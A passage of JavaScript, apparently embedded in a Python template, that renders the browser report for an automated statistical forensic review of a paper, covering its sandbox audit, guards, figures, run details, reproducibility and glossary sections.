      'forbidden tool was called, but the arithmetic was ASSERTED rather than '+
      'performed. Every tool call that did run was on the validated surface. '+
      'Treat those findings as unverified.';
  } else if(nUn===0){
    verdict='CLEAN';
    /* AND SAY WHY THE CHAIN OF REASONING SEEMS TO DISAGREE.
       That page marks rows "unvalidated surface" -- three of them on the
       archived cerebrolysin run -- while this page says CLEAN. Both statements
       are true and the document never reconciled them, so a careful reader is
       left deciding which of our own pages to believe about our own conduct.

       The distinction is real: those calls emit the output SCHEMA and compute
       no statistic, which is why they are outside the validated forensic
       surface and why their presence does not make this verdict a breach. It
       takes one sentence, and its absence was worth more doubt than it saved. */
    const nUnvalidated=(D.calls||[]).filter(c=>!c.validated).length;
    detail='Every tool call went through the validated forensic surface. No '+
      'statistic in this report was computed by anything unaudited.'+
      (nUnvalidated
        ? ' The Chain of reasoning marks '+nUnvalidated+' call(s) "unvalidated '+
          'surface"; those emit this report\'s output schema and compute no '+
          'statistic, which is why they sit outside the forensic surface without '+
          'making this a breach.'
        : '');
  } else if(!nSev){
    verdict='SURFACE BREACH';
    detail=nUn+' call(s) used a tool outside the declared allowlist, but NONE of '+
      'them computed a statistic -- typically file reading. No number in this '+
      'report came from an unvalidated calculation, though the run did not stay '+
      'within the surface it declared.';
  } else {
    verdict='SEVERE BREACH';
    detail=nSev+' of '+nUn+' out-of-surface call(s) COMPUTED A STATISTIC outside '+
      'the validated tools. Any finding resting on those is unaudited: the guards '+
      '(printed precision, rounding intervals, applicability refusals) did not '+
      'apply, and the result is indistinguishable in this report from one that '+
      'was checked properly. Identify them in the chain of reasoning before '+
      'believing any number here.';
  }
  /* THE SAME PREDICATE AS THE VERDICT ABOVE. `n_unvalidated_total` counts
     calls whose `surface` is UNVALIDATED; this filtered on `validated===false`,
     which is `surface !== "forensic_mcp"` and therefore includes every
     harness and allowlisted built-in call -- the file reads. So a run whose
     verdict was CLEAN printed "The out-of-surface calls" directly underneath
     with a table of Read/Glob calls in it, which is the audit contradicting
     itself on the one question it exists to answer. */
  const calls=(D.calls||[]).filter(c=>String(c.surface||'')==='UNVALIDATED');
  return `<h2>Audit</h2>
    <h3>Did anything run outside the sandbox?</h3>
    <p><b>${esc(verdict)}</b> &mdash; ${esc(detail)}</p>
    ${s.verdict?`<p class="muted">Recorded verdict: ${esc(s.verdict)}</p>`:''}
    ${calls.length?`<h4>The out-of-surface calls</h4>${
      tbl(['stage','#','tool','input'],calls.map(c=>[esc(DN(c.stage)),esc(c.seq),
        esc(c.tool),`<code>${esc(JSON.stringify(c.input).slice(0,120))}</code>`]))}`
      /* Counted but not identifiable: an older ledger recorded no surface per
         call. Say so rather than showing an empty section under a breach. */
      :(nUn?`<p class="muted">The audit counted ${esc(nUn)} such call(s), but this
        bundle's ledger does not record which -- see
        <code>analysis/sandbox_audit.json</code>.</p>`:'')}
    <details><summary>Full sandbox record</summary>
      <pre>${esc(JSON.stringify(s,null,2))}</pre></details>
    <h3>Guards</h3>
    <p class="muted">A guard is a precondition a check cannot degrade gracefully without.
      Supplied the wrong scale bounds, GRIM does not get vaguer -- it INVERTS, and returns
      <i>impossible</i> on an ordinary number. A defaulted guard is therefore the most likely
      single cause of a false accusation in this report.</p>
    ${Object.keys(g).length ? Object.entries(g).map(([stage,a])=>`
      <h4>${esc(DN(stage))}</h4>
      <p>${esc(a.n_supplied)} of ${esc(a.n_guard_slots)} guard slots supplied
        (${Math.round((a.supplied_rate||0)*100)}%) across ${esc(a.n_guarded_calls)} guarded call(s).</p>
      ${tbl(['tool','supplied','defaulted','excused'],
        Object.entries(a.per_tool||{}).map(([t,c])=>[`<code>${esc(t)}</code>`,
          esc(c.supplied),esc(c.defaulted),esc(c.excused??0)]),{filterFrom:99})}
      ${(a.defaulted_calls||[]).length?`<h5>Calls that let a guard default</h5>${
        tbl(['#','tool','guard','what that means'],(a.defaulted_calls||[]).map(c=>[esc(c.seq),
          `<code>${esc(c.tool)}</code>`,`<code>${esc(c.guard)}</code>`,
          esc(c.consequence)]),{filterFrom:99})}`:''}
      ${/* EXCUSED slots are ones whose default is the CORRECT answer, so they
            are left out of the alarm -- but leaving them out of the page too
            would be hiding them, and the rate above would be unexplained. */
        (a.excused_calls||[]).length?`<h5>Guards excused from the alarm
          (${esc(a.n_excused)})</h5>
        <p class="muted">Not counted as defaulted: the default is the right
          reading here, so it inverts nothing. Listed because a rate of 100%
          that quietly skipped a slot would be worse than one that did not.</p>${
        /* GROUPED, because the ungrouped table was almost entirely repetition.
           MEASURED on the archived cerebrolysin run: stage 1 listed 11 excused
           rows carrying 3 distinct (tool, guard, reason) triples, stage 2 listed
           7 carrying 2 -- one ~200-character justification printed eleven times
           to contextualise a single genuinely defaulted guard. Signal to noise
           near zero, and the noise visually dwarfed the signal it was there to
           explain.

           Nothing is hidden: every sequence number is still printed, in the
           row's own cell, so a reader can still find any individual call. */
        tbl(['calls','tool','guard','defaulted to','why that is sound'],
          (function(){
            const by={};
            (a.excused_calls||[]).forEach(c=>{
              const k=[c.tool,c.guard,c.default,c.why_sound].join(' :: ');
              (by[k]=by[k]||{c:c,seqs:[]}).seqs.push(c.seq);
            });
            return Object.values(by).map(g=>[
              (g.seqs.length>1?`<b>${g.seqs.length}&times;</b> `:'')
                +`<span class="muted">#${g.seqs.map(esc).join(', #')}</span>`,
              `<code>${esc(g.c.tool)}</code>`,`<code>${esc(g.c.guard)}</code>`,
              `<code>${esc(g.c.default)}</code>`, esc(g.c.why_sound)]);
          })(),{filterFrom:99})}`:''}
    `).join('') : `<p class="muted">No guard audit recorded for this run.</p>`}`;
}});

S.push({id:'figures', label:'Figures',
  count:()=>Math.max((D.figure_records||[]).length,
                     ((D.anatomy||{}).figures||[]).length), build(){
  /* Two sources, and they answer different questions. The EXTRACTOR knows
     where the image is and what it looks like; the MODEL read the paper and
     knows what the figure is for and whether its numbers appear anywhere else.
     Merged on label, because a figure with a crop but no reading is half a
     record and so is the reverse. */
  const crops=D.figure_records||[], read=(D.anatomy||{}).figures||[];
  const byLabel={};
  crops.forEach(c=>{byLabel[String(c.label||'').toLowerCase()]={...c};});
  read.forEach(r=>{const k=String(r.label||'').toLowerCase();
    byLabel[k]={...(byLabel[k]||{label:r.label}), read:r};});
  const f=Object.values(byLabel);

  const unique=read.filter(r=>r.carries_unique_values);
  const gap=unique.length?`<div class="note"><b>${unique.length} figure(s) carry
    numbers that appear nowhere in the text:</b> ${
    unique.map(r=>esc(r.label)).join(', ')}. Nothing in this review could check
    those values. This is the review's largest single blind spot on this
    paper.</div>`:'';

  if(!f.length) return `<h2>Figures</h2><p class="muted">No figures were extracted.
    Figure extraction is opt-in (<code>--figures</code>); without it the analysis reads
    the paper as text and cannot see anything appearing only in a plot.</p>`;
  /* The crop, and a LINK to where it came from -- not the whole source page
     rendered underneath it. The page image is already on the Source &
     extraction tab, and repeating it here doubled the height of every entry
     for something the reader has a better view of elsewhere. */
  return `<h2>Figures</h2>
    <p class="muted">Each figure as extracted, beside what the model reading the
      paper understood it to be. Nothing here has been read for its DATA:
      values that appear only in a plot are not available to any check.</p>
    ${gap}`+
    f.map(x=>{
      const img=(x.image_path||'').split('/').pop();
      const r=x.read||{};
      const bars=r.error_bars||x.error_bar_meaning;
      const panels=(r.panels||[]);
      return `<h3>${esc(x.label||'Figure')}</h3>
      ${img?`<img src="figures/${encodeURIComponent(img)}"
        alt="${esc(x.label||'figure')}" style="max-width:100%;border:1px solid var(--rule)">`:
        '<p class="muted">No image: this figure was described from the paper but not extracted.</p>'}
      ${kv([
        ['caption', esc(r.caption||x.caption||'') || '<span class="muted">not captured</span>'],
        ['page', (x.page||r.page)?`<a href="#" onclick="goSource(${+(x.page||r.page)},null);return false"
            >p.${esc(x.page||r.page)} in the paper</a>`:'<span class="muted">unknown</span>'],
        ['kind', r.is_data_figure===true
            ? 'data figure <span class="muted">-- values could in principle be read off it</span>'
            : (r.is_data_figure===false
               ? 'not a data figure <span class="muted">-- diagram, schematic or photograph</span>'
               : '<span class="muted">not classified</span>')],
        ['panels', panels.length
            ? panels.map(p=>`<b>${esc(p.panel||'')}</b> ${esc(p.chart_type||'')}${
                p.shows?` <span class="muted">-- ${esc(p.shows)}</span>`:''}`).join('<br>')
            : (r.n_panels?esc(r.n_panels):'<span class="muted">not classified</span>')],
        ['carries values found nowhere else', r.carries_unique_values===true
            ? '<span class="mark no">yes -- this review could not check them</span>'
            : (r.carries_unique_values===false
               ? '<span class="mark yes">no -- the values also appear in the text</span>'
               : '<span class="muted">not determined</span>')],
        ['error bars', bars
            ? esc(bars)
            : '<span class="muted">not stated in the caption -- no dispersion can be read off this figure</span>'],
        ['crop confidence', x.crop_confidence==='high'
            ? '<span class="mark yes">high</span> <span class="muted">-- artwork located and cropped to</span>'
            : cropTag(x.crop_confidence)],
        ['provenance', esc((x.provenance||{}).method||'')||'<span class="muted">not recorded</span>'],
        ['source of this record', x.reconstructed_from_filename
            ? '<span class="muted">reconstructed from the image filename; the extractor wrote no record file</span>'
            : (img?'the extractor':'the model reading the paper')],
      ].concat((x.warnings||[]).map(w=>['warning', esc(w)])))}`;
    }).join('');
}});

S.push({id:'run', label:'Run details', build(){
  const rm=D.run_meta||{}, st=rm.stages||{};
  /* `Full metadata` used to be a raw JSON dump below the table, so every field
     the table did not name was reachable only by reading JSON. Anything not
     already shown is folded in as its own row instead. */
  const shown=new Set(['stages','reproducibility','consequence',
    'severity_reconciliation','sandbox']);
  const rest=Object.entries(rm).filter(([k])=>!shown.has(k))
    .map(([k,v])=>[esc(k.replace(/_/g,' ')), val(v)]);
  const rep=rm.reproducibility||{};
  return `<h2>Run details</h2>
    ${/* NO COST COLUMN. The payload no longer carries what the run cost -- the
          bundle is forwarded to the authors of the paper it criticises, and
          our billing is not evidence about their work (see `_is_operator_key`).
          The column was left in place at first and rendered `$0.0000` for
          every stage, which is not a redaction but a false statement that the
          review was free. */''}
    ${/* The result column showed a bare count for the sweep and a bare coded
          word for the editorial stage: a number that elsewhere goes by
          "findings" meaning something else, and a verdict defined nowhere
          near it. Both now say what they are. */''}
    ${tbl(['stage','model','effort','output tokens','wall (s)','result'],
      Object.entries(st).map(([k,v])=>[esc(DN(k)),esc(v.primary_billed_model||v.model),
        esc(v.effort||rm.effort||'-'),esc(v.output_tokens),
        esc(Math.round(v.wall_seconds||0)),
        v.num_findings!=null
          ? esc(v.num_findings)+' <span class="muted">tool verdicts recorded</span>'
          : (v.verdict?verdictWord(v.verdict)+' <span class="muted">(the verdict)</span>':'')]),{filterFrom:99})}
    <h3>The run</h3>
    ${kv(rest)}
    ${/* ONE NUMBER, THREE CAUSES, AND THE PANEL SHOWED THE WORST OF THEM.
          Greg read "n valid 1 / n invalid 34" as near-total failure, which is
          exactly what it looks like. Measured over the archive (633 distinct
          commands): 127 are the model correctly reporting that no command
          reproduces a judgement, 205 are a real command in a shape the CLI
          does not accept, 28 never ran. The disclaimer sat BELOW the number
          and could not outrun it.

          The strongest single case: 9 of this paper's failures are `chi2`
          calls passing `--observed '[[646,450,...]]'` where the CLI parses
          `"646,450;647,487"`. Re-run by hand in the correct shape: exit 0,
          chi-square 180.7393, matching the paper's printed 180.74. The check
          is right, the finding is right, the STRING is wrong -- and "n valid
          1" was describing that. */''}
    <h3>Can a reader re-run these findings?</h3>
    <p class="muted">Every finding that is an ARITHMETIC RESULT carries a
      command that reproduces it. A finding that is a reading of the paper --
      "no confidence intervals are reported for any null claim" -- has nothing
      to reproduce, and that is not a failure. The three rows below are
      different things and only the last two are defects. None of them says a
      finding is wrong: a command can be mistyped and its arithmetic still be
      exactly right.</p>
    ${reproTally(rep)}
    <details><summary class="muted">the raw counters</summary>
      ${kv(Object.entries(rep).filter(([k])=>k!=='problems')
          .map(([k,v])=>[esc(k.replace(/_/g,' ')), val(v)]))}</details>
    ${(rep.problems||[]).length?`<h4>Commands that would not run</h4>
      <p class="muted">Findings whose reproduction command failed to parse or
        to execute. Nothing here says the FINDING is wrong -- only that a reader
        cannot re-run it from the string we printed.</p>${
      /* CLASSIFIED, AND THE CRASH LOG PUT AWAY.
         This shipped 29 rows of raw Typer usage errors -- box-drawing
         characters, truncated mid-word -- to a reader who may be a journal
         editor. The framing sentence above is right; the evidence under it was
         a stack of terminal output, and it is the first thing an opposing
         statistician would quote. It is OUR defect, not a defect in the
         findings, and printing it raw made it look like the toolkit cannot
         re-run its own arithmetic.

         The cause is what a reader can act on: an unknown flag is a different
         bug from a wrong argument shape, and the counts say which to fix first.
         The raw text stays, one click away -- an audit trail that has been
         tidied out of existence is not one. */
      (function(){
        const KIND=[
          [/no such option|unrecognized|unknown option/i,'unknown flag name'],
          [/missing argument|takes \d+|got unexpected|invalid value|Usage:/i,
           'wrong argument shape'],
          [/command not found|not a .*command|No such command/i,
           'not a metascience command'],
          [/timed out|timeout/i,'timed out'],
        ];
        const by={};
        (rep.problems||[]).forEach(p=>{
          const s=String(p);
          const hit=KIND.find(([re])=>re.test(s));
          const k=hit?hit[1]:'other';
          (by[k]=by[k]||[]).push(s);
        });
        const rows=Object.entries(by).sort((a,b)=>b[1].length-a[1].length);
        const name=s=>{const m=/finding\[([^\]]+)\]/.exec(s);
                       return m?m[1]:s.slice(0,40);};
        return tbl(['cause','count','findings'],rows.map(([k,v])=>[
          esc(k), String(v.length),
          `<span class="muted">${v.map(s=>esc(name(s))).join(', ')}</span>`]))
          +`<details><summary class="muted">the raw output, verbatim</summary>${
            tbl(['problem'],(rep.problems||[]).map(p=>[esc(p)]))}</details>`;
      })()}`:''}
    ${rm.consequence?`<h3>How many findings say what they change</h3>
      <p class="muted">Severity says whether numbers can be right; consequence
        says whether anything the paper CLAIMS depends on them. These count how
        many findings answered that second question, and how many of those
        answers were computed rather than asserted.</p>${
      kv(Object.entries(rm.consequence)
      .map(([k,v])=>[esc(k.replace(/_/g,' ')), val(v)]))}`:''}
    ${rm.severity_reconciliation?`<h3>Did the write-up keep the tool's verdict?</h3>
      <p class="muted">Each tool returns its own severity. The model then records
        one in the finding. This compares the two: a divergence is the model
        having escalated or softened a verdict the tool had already reached, and
        is worth knowing about in either direction.</p>${
      kv(Object.entries(rm.severity_reconciliation).filter(([k])=>k!=='divergences')
        .map(([k,v])=>[esc(k.replace(/_/g,' ')), val(v)]))}
      ${/* THE COUNT WAS SHOWN AND THE LIST WAS FILTERED OUT. "n diverged: 6"
            told a reader that six verdicts were rewritten and refused to say
            which six or in which direction -- and an UPGRADE, the model making
            a finding more severe than the check that produced it, is the
            single most accusation-relevant record in the whole run. The
            strings are already reader-grade on disk. */''}
      ${rm.pdf_error?`<p class="conseq unexplained">No report.pdf was written: ${esc(rm.pdf_error)}</p>`:''}
      ${(rm.severity_reconciliation.divergences||[]).length?`<h4>Which ones
        (${rm.severity_reconciliation.divergences.length})</h4>
        <p class="muted">Read <i>upgraded</i> as the write-up making a finding
          MORE severe than the check that produced it.</p>
        <ul>${rm.severity_reconciliation.divergences.map(
          d=>`<li class="mono">${esc(d)}</li>`).join('')}</ul>`:''}`:''}
    ${/* WHICH MODEL ACTUALLY RAN. The stage table names one model per stage and
          every archived run records `model_switched: true` with a
          `models_resolved` list of two -- so the page said the review was
          produced by Opus while a second, much smaller model had also been in
          the loop. `truncated_by_budget` is the graver one: a stage cut short
          did not finish looking, which is a coverage fact, and it was
          reachable nowhere. */''}
    ${Object.entries(st).some(([,v])=>v.model_switched||v.truncated_by_budget
        ||v.truncated_by_timeout
        ||(v.fallbacks||[]).length||(v.models_resolved||[]).length>1)
      ? `<h3>Which model actually ran</h3>${
        kv(Object.entries(st).map(([k,v])=>[esc(DN(k)),
          ((v.models_resolved||[]).length
            ? (v.models_resolved||[]).map(m=>`<code>${esc(m)}</code>`).join(', ')
            : `<code>${esc(v.model||'-')}</code>`)
          +(v.model_switched?' <span class="muted">-- more than one model was used in this stage</span>':'')
          +(v.truncated_by_budget?' <span class="conseq unexplained">-- STAGE TRUNCATED BY BUDGET: it stopped before it had finished looking</span>':'')
          +(v.truncated_by_timeout?' <span class="conseq unexplained">-- STAGE CUT OFF BY THE PER-STAGE TIMEOUT: it stopped before it had finished looking</span>':'')
          +((v.fallbacks||[]).length?` <span class="muted">-- fell back: ${
              esc((v.fallbacks||[]).join(', '))}</span>`:'')]))}`
      : ''}`;
}});

S.push({id:'about', label:'How to read this', build(){
  const md=t=>esc(t).replace(/\*\*(.+?)\*\*/g,'<b>$1</b>').replace(/\n\n/g,'</p><p>');
  const A=D.acronyms||[], G=D.glossary||[];
  return `<h2>How to read this</h2><p>${md(D.disclaimer_long||'')}</p>`+
    `<p>${md(D.action_note||'')}</p>`+
    `<h2 id="terms">Statistical terms</h2>
     <p class="muted">What each problem is, in plain language, and which checks
       in this toolkit bear on it. A check listed here may still not have run on
       this paper -- see Coverage for what did.</p>`+
    G.map(g=>`<details><summary><b>${esc(g.term)}</b></summary>
      <p>${esc(g.plain)}</p>
      <p class="muted"><b>For example.</b> ${esc(g.example)}</p>
      <p class="muted">${g.detects.length
        ? 'Checked here by: '+g.detects.map(d=>`<code>${esc(d)}</code>`).join(', ')
        : 'No check in this toolkit detects this. It is defined because the '
          +'report may still mention it.'}</p></details>`).join('')+
    `<h2>Acronyms in this paper</h2>
     <p class="muted">Taken from the paper's own definitions -- the words it
       wrote out before putting the short form in brackets. Not guessed: an
       invented expansion of a clinical instrument would be worse than none, so
       an acronym the paper never defines does not appear here.</p>`+
    (A.length?tbl(['acronym','stands for'],
      A.map(a=>[`<code>${esc(a.acronym)}</code>`,esc(a.expansion)]),{filterFrom:20})
      :'<p class="muted">The paper defines no acronyms in the usual form.</p>')+
    codebookHtml();
}});

/* "START HERE" BELONGS SECOND, NOT TWELFTH.
   This section holds the base rate, the meaning of every coded word on the
   page, and the one instruction that matters -- "public allegations are not an
   appropriate use of this output" -- and it was the LAST item in a
   twelve-section contents. Nobody reads item 12 first, and the reader who most
   needs it is the one who opened the document cold.

   Moved by reordering the mounted array rather than by moving its `S.push`
   1,900 lines up: the push sits with the code that builds it, and separating a
   section's definition from its position would make the next reorder a merge
   conflict instead of one line. Renamed to match: "How to read this" describes
   a manual, "Start here" is an instruction. */
(function moveStartHereSecond(){
  const i=S.findIndex(s=>s.id==='about');
  if(i>1){ const [about]=S.splice(i,1); about.label='Start here'; S.splice(1,0,about); }
})();

const nav=document.getElementById('nav'), main=document.getElementById('main');
S.forEach(s=>{
  const a=document.createElement('a'); a.href='#'+s.id; a.dataset.id=s.id;
  const n=s.count?s.count():null;
  /* The badge is a bare number beside a word, and on Findings it counted the
     REPORT findings while the Overview "findings" row counted the sweep --
     two unlabelled values of one word. The title states each badge's
     universe. */
  a.innerHTML=esc(s.label)+(n!=null?`<span class="c"${s.countTitle?` title="${esc(s.countTitle())}"`:''}>${n}</span>`:'');
  nav.appendChild(a);
  const sec=document.createElement('section'); sec.id='s-'+s.id; main.appendChild(sec);
});
const built={};

/* PRINT EVERYTHING, not whatever happened to be open.
   `built{}` fills lazily, so a bare window.print() emits the sections a reader
   clicked and silently omits the rest -- a partial document that looks whole.
   This forces every section, then tells the reader how many it built, because
   a 60-page print job started by accident is its own kind of harm. */
function printAll(){
  const unbuilt=S.filter(s=>!built[s.id]);
  unbuilt.forEach(s=>{
    const sec=document.getElementById('s-'+s.id);
    if(!sec) return;
    try{ sec.innerHTML=s.build(); built[s.id]=1; wireTables(sec); s.after&&s.after(); }
    catch(e){ sec.innerHTML='<p class="muted">This section could not be built '
      +'for printing: '+esc(String(e&&e.message||e))+'</p>'; built[s.id]=1; }
  });
  const head=document.getElementById('printhead');
  if(head) head.style.display='block';
  window.print();
}

function show(id){
  const s=S.find(x=>x.id===id)||S[0];
  document.querySelectorAll('nav a').forEach(a=>a.classList.toggle('active',a.dataset.id===s.id));
  document.querySelectorAll('section').forEach(x=>x.classList.remove('on'));
  const sec=document.getElementById('s-'+s.id);
  /* THE PANEL IS SHOWN BEFORE ANYTHING FALLIBLE RUNS, AND EVERY FALLIBLE STEP
     IS CAUGHT. The old order hid every section, then built, then wired, then
     ran after(), and only THEN added `on`. So a single throw anywhere in that
     middle -- one null lookup in one panel's wiring -- left EVERY section
     hidden and the reader looking at a page containing nothing but the nav.

     MEASURED 2026-09-01: that is what shipped. `build()` early-returns
     `v2FindingsPage()` on a v2 run, which renders none of the v1 filter
     markup, while `after()` still ran the v1 wiring and threw on
     `document.getElementById('fcount')`. Clicking Findings -- the main tab, on
     every current run -- produced a blank page.

     A panel that cannot wire itself should still show its content, and should
     say what failed rather than looking like an empty section. */
  sec.classList.add('on');
  if(!built[s.id]){
    built[s.id]=1;
    /* A BUILDER MAY RETURN A STRING OR A NODE. `tables` builds with
       `document.createElement` and returns the element, every other section
       returns HTML text, and `innerHTML=` stringified the node -- so that pane
       rendered the literal text `[object HTMLDivElement]` while the nav beside
       it correctly counted 3 tables. Accepting both here fixes it for every
       builder rather than for the one that happened to be caught. */
    try { const out=s.build();
          if(out && out.nodeType){ sec.textContent=''; sec.appendChild(out); }
          else sec.innerHTML=out; }
    catch(e){ sec.innerHTML='<h2>'+esc(s.label||s.id)+'</h2>'
      +'<p class="muted">This panel failed to render: '+esc(String(e&&e.message||e))
      +'. The data is in the bundle\u2019s JSON files; this is a viewer fault,'
      +' not a fact about the paper.</p>'; }
    try { wireTables(sec); } catch(e){}
    try { s.after&&s.after(); }
    catch(e){ sec.insertAdjacentHTML('beforeend',
      '<p class="muted">Some controls on this panel could not be wired: '
      +esc(String(e&&e.message||e))+'. The content above is unaffected.</p>'); }
  }
  window.scrollTo(0,0);
  /* EVERY "show p.N in the paper" link was dead. `applyJump` ran only inside
     the source section's `after()`, and `after()` runs only on the FIRST
     build -- and Source is nav item 2, so it is normally already built before
     a reader clicks any evidence link. `goSource` set `window.__jump`, the
     hash changed, the section appeared, and the jump was never applied: 110
     report anchors plus every finding and figure link went nowhere. It has to
     fire on ARRIVAL, not on construction. */
  if(s.id==='source') applyJump();
}
addEventListener('hashchange',()=>show(location.hash.slice(1)));
show(location.hash.slice(1)||'overview');
/* THE RUNNING HEADER'S CONTENT, assembled once from facts already in the
   payload. Short cite, run date, and the disclaimer -- on every sheet, because
   a page that leaves this document leaves its context behind. */
(function(){
  const h=document.getElementById('printhead');
  if(!h) return;
  const meta=D.paper_metadata||{};
  /* A SHORT cite. The first draft printed `meta.authors` whole and produced a
     running header seventeen names long on the first paper I tried it on,
     which is a header nobody reads and a waste of every sheet. First author
     plus `et al.` is what a running head is for. */
  const list=Array.isArray(meta.author_list)&&meta.author_list.length
    ? meta.author_list
    : String(meta.authors||'').split(',').map(s=>s.trim()).filter(Boolean);
  const first=String(list[0]||'').trim();
  const surname=first?first.split(/\s+/).pop():'';
  const cite=[surname+(list.length>1?' et al.':''), meta.year||''].
    filter(Boolean).join(' ').trim();
  const doi=D.paper_id||meta.doi||'';
  h.innerHTML='<b>'+esc(cite||D.paper_title||'This paper')+'</b>'
    +(doi?' &middot; '+esc(String(doi)):'')
    +' &middot; FMT automated review &mdash; NOT a finding of misconduct'
    +(D.run_date?' &middot; '+esc(String(D.run_date)):'');
})();

/* The button lives beside the theme toggle, and says what it will do before
   it does it -- a reader who clicks Print on a twelve-section forensic report
   should know it is not two pages. */
(function(){
  const t=document.getElementById('theme');
  if(!t||!t.parentNode) return;
  const b=document.createElement('button');
  b.className='printbtn'; b.id='printbtn'; b.textContent='print';
  b.title='Builds every section first, then opens the print dialog. '
        + S.length + ' sections.';
  b.onclick=printAll;
  t.parentNode.insertBefore(b, t.nextSibling);
})();

const navBtn=document.getElementById('navtoggle');
navBtn.onclick=()=>{
  document.body.classList.toggle('navhid');
  try{ localStorage.setItem('fmNavHidden', document.body.classList.contains('navhid')?'1':''); }catch(e){}
};
try{ if(localStorage.getItem('fmNavHidden')) document.body.classList.add('navhid'); }catch(e){}
/* Persisted, like the nav-hidden state beside it. Without this the toggle
   reset on every reload -- and a reader who prefers dark had to re-pick it
   each time they opened a bundle. */
document.getElementById('theme').onclick=()=>{
  const r=document.documentElement;
  const cur=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light');
  const next=cur==='dark'?'light':'dark';
  r.setAttribute('data-theme',next);
  try{ localStorage.setItem('fmTheme',next); }catch(e){}};
try{ const t=localStorage.getItem('fmTheme');
     if(t) document.documentElement.setAttribute('data-theme',t); }catch(e){}
/* Click-to-define. Any element carrying data-cb -- a severity word, the
   verdict, a jargon term -- jumps to that anchor on the How-to-read-this
   page, where the codebook and the glossary live. Hover already shows the
   short definition; the click serves the reader who wants the full table,
   and readers on touch screens, who have no hover at all. Delegated at the
   document because sections render lazily. */
/* THE HOVER NETWORK, delegated at the document because sections render
   lazily -- the same reason the codebook handler below is delegated.

   Greg asked for this directly: "hover their cursor over a value and see the
   network of related values, and all the associated checks for values of that
   type." A value's network is its group siblings, the same number printed
   elsewhere in the paper, and the group size that permitted its check. Every
   one of those edges is computed in `values.py` and carried on the element, so
   this handler only paints what the register already knows -- it does not
   decide what is related, which would put a second opinion in the viewer.

   Highlight only. No click target, no navigation, nothing that can be missed
   by a reader who never hovers: the table below still reads as a table. */
function vpaint(el, on){
  const ids=(el.dataset.rel||'').split(' ').filter(Boolean);
  el.classList.toggle('vself', on);
  ids.forEach(id=>{
    document.querySelectorAll('[data-vid="'+(window.CSS&&CSS.escape?CSS.escape(id):id)+'"]')
      .forEach(t=>{ if(t!==el) t.classList.toggle('vhot', on); });
  });
}
document.addEventListener('mouseover',e=>{
  const t=e.target&&e.target.closest?e.target.closest('.val'):null;
  if(t) vpaint(t, true);
});
document.addEventListener('mouseout',e=>{
  const t=e.target&&e.target.closest?e.target.closest('.val'):null;
  if(t) vpaint(t, false);
});

document.addEventListener('click',e=>{
  const t=e.target&&e.target.closest?e.target.closest('[data-cb]'):null;
  if(!t) return;
  e.preventDefault();
  location.hash='about';
  setTimeout(()=>{const el=document.getElementById(t.dataset.cb);
    if(!el) return;
    /* An integrity card is a collapsed <details>. Scrolling to a shut one
       lands the reader on a summary line that looks like what they clicked
       from, with the answer still hidden -- which reads as a dead link. */
    if(el.tagName==='DETAILS') el.open=true;
    el.scrollIntoView({block:'start'});},40);
});
</script></body></html>
"""
